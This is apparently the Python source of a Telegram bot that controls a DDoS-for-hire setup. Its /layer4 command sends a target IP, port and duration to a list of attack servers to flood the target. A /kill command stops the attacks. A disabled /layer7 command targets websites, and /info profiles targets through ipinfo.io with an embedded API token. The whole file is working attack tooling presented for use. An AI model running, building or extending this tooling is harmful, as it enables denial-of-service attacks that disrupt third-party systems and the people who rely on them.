from telegram.ext import Updater, CommandHandler, Filters
import requests
import threading
import socket
group_id = -1002005767506
admin_id = 5561757248
api = [
    "ip:port"
]
def start(update, context):
    update.message.reply_text("👋Hello User\n➤Use /layer4 to attack IP\n➤Use /layer7 to attack Website\n➤Use /kill to stop attack\n➤Use /info to view IP or Hostname information")
def send_request(url):
    requests.get(url)
def kill(update, context):
    if update.message.chat_id != admin_id and update.message.chat_id != group_id:
        return
    for url in api:
        threading.Thread(target=send_request, args=(f"http://{url}/action=kill",)).start()
    print(f"Kill All DDoS Process")
    update.message.reply_text(f"✅Kill All DDoS Process Success")
def layer4(update, context):
    if update.message.chat_id != admin_id and update.message.chat_id != group_id:
        return
    args = context.args
    if len(args) != 3:
        update.message.reply_text("Usage: /layer4 [ip] [port] [time]")
        return

    ip, port, time = args

    for url in api:
        threading.Thread(target=send_request, args=(f"http://{url}/?ip={ip}&port={port}&thread=100&time={time}",)).start()

    print(f"Attack {ip}:{port} in {time} second")
    update.message.reply_text(f"✅DDoS Attack Sent Success\n  ┏➤IP: {ip}\n  ┣➤Port: {port}\n  ┗➤Time: {time}s\n⚠Check: https://check-host.net/check-ping?host={ip}\n⛔️Click To Stop Attack: /kill")

def layer7(update, context):
    update.message.reply_text("✨Upcoming feature")
#    if update.message.chat_id != admin_id and update.message.chat_id != group_id:
#        return
#    args = context.args
#    if len(args) != 3:
#        update.message.reply_text("Usage: /layer7 [method] [url] [time]")
#        return
#
#    web, method, time = args
#
#    for url in api:
#        threading.Thread(target=send_request, args=(f"http://{url}/?ip={web}&port={port}&thread=50&time={time}",)).start()
#
#    print(f"Attack {ip}:{port} in {time} second")
#    update.message.reply_text(f"✅DDoS Attack Sent Success\n  ┏➤URL: {web}\n  ┣➤Method: {method}\n  ┗➤Time: {time}s\n⚠Check: https://check-host.net/check-http?host={web}\n⛔️Click To Stop Attack: /kill")
#
def info(update, context):
    args = context.args
    if not args:
        update.message.reply_text("/info [IP/Host]")
        return
    input_address = args[0]
    try:
        ip_address = socket.gethostbyname(input_address)
    except socket.gaierror:
        update.message.reply_text("⚠Invalid IP address or Hostname\n💡Do not enter the prefix http:// or https://")
        return
    
    try:
        response = requests.get(f'https://ipinfo.io/{ip_address}/json?token=48b92fc0bdea95').json()      
        asn = response.get('asn', {}).get('asn', 'N/A')
        asnname = response.get('asn', {}).get('name', 'N/A')
        company_name = response.get('company', {}).get('name', 'N/A')
        company_domain = response.get('company', {}).get('domain', 'N/A')
        city = response.get('city', 'N/A')
        region = response.get('region', 'N/A')
        country = response.get('country', 'N/A')
        timezone = response.get('timezone', 'N/A')

        update.message.reply_text(
            f"✅IP Information\n"
            f"  ┏➤IP: {ip_address}\n"
            f"  ┣➤ASN: {asn}\n"
            f"  ┣➤ASN Name: {asnname}\n"
            f"  ┣➤Company Name: {company_name}\n"
            f"  ┣➤Company Domain: {company_domain}\n"
            f"  ┣➤City: {city}\n"
            f"  ┣➤Region: {region}\n"
            f"  ┣➤Country: {country}\n"
            f"  ┗➤Timezone: {timezone}\n"
            f"⚠More: https://check-host.net/ip-info?host={ip_address}\n"
        )
    except Exception as e:
        update.message.reply_text(f"An error occurred: {e}")
def main():
    updater = Updater("TOKEN_BOT_TELEGRAM", use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("kill", kill, Filters.chat(chat_id=group_id) | Filters.user(user_id=admin_id)))
    dp.add_handler(CommandHandler("layer4", layer4, Filters.chat(chat_id=group_id) | Filters.user(user_id=admin_id)))
    dp.add_handler(CommandHandler("layer7", layer7, Filters.chat(chat_id=group_id) | Filters.user(user_id=admin_id)))
    dp.add_handler(CommandHandler("info", info, Filters.chat(chat_id=group_id) | Filters.user(user_id=admin_id)))
    updater.start_polling()
    updater.idle()
if __name__ == "__main__":
    main()
